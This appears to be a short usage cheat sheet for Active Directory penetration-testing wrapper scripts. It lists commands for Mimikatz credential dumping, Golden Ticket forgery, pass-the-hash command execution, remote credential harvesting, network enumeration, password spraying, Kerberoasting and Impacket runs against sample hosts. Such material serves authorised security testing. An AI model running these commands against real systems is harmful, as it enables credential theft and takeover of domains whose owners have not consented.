# Dump credentials from local system
./mimikatz-wrapper.py local all

# Create a Golden Ticket
./mimikatz-wrapper.py local golden -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Run credential harvesting on remote systems
./mimikatz-wrapper.py remote -t 192.168.1.100 -d contoso.local -u administrator -p Password123!

# Execute command via Pass-the-Hash
./mimikatz-wrapper.py pth -t 192.168.1.100 -d contoso.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -c "whoami"


# Local enumeration with network scanning
./powershell-enumeration.py local -n 192.168.1.0/24

# Remote enumeration of a target system
./powershell-enumeration.py remote -t 192.168.1.100 -u administrator -p Password123!

# Network discovery scan
./powershell-enumeration.py scan -n 192.168.1.0/24

# Full enumeration campaign
./powershell-enumeration.py full -t 192.168.1.100 192.168.1.101 -u administrator -p Password123!


./adpentest-toolkit.py check - Check if required tools are installed
./adpentest-toolkit.py spray - Run password spraying
./kerberoast.py -t 10.0.0.1 - Run Kerberoasting against a specific target
./impacket-toolkit.py all -t 192.168.1.100 - Run all Impacket tools against a target
./adpentest-toolkit.py full - Run all tools in sequence